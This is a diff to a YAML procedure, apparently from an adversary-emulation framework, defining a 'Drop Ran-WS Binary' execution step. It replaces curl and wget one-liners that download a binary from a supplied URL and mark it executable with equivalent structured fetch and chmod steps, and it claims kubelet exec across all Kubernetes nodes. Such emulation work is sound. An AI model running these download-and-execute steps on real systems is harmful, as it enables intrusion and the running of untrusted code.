@@ -1,7 +1,7 @@
 name: Drop Ran-WS Binary
 description: Downloads a binary from the provided source to a system
 tactic: Execution
-techniques: ["User Execution"]
+techniques: [ "User Execution" ]
 parameters:
   URL:
     type: string
@@ -12,11 +12,14 @@ parameters:
     default: /tmp/ran-ws
     description: the destination path of the binary at the remote system
 procedures:
-  - key: curl
-    command: curl -sS -L ${URL} -o ${DST_BIN} && chmod +x ${DST_BIN} 
-  - key: wget
-    command: wget ${URL} -O ${DST_BIN} && chmod +x ${DST_BIN} 
+  - key: http-request
+    steps:
+      - fetch:
+          url: ${URL}
+          to: ${DST_BIN}
+          follow_redirects: true
+      - chmod: +x ${DST_BIN}
 preconditions:
   kind: System
   accessLevel: "user-exec"
-effects: ["sys.has-binary(${DST_BIN})", "k8s.kubelet-exec(sys, all(k8s.Node))"]
+effects: [ "sys.has-binary(${DST_BIN})", "k8s.kubelet-exec(sys, all(k8s.Node))" ]
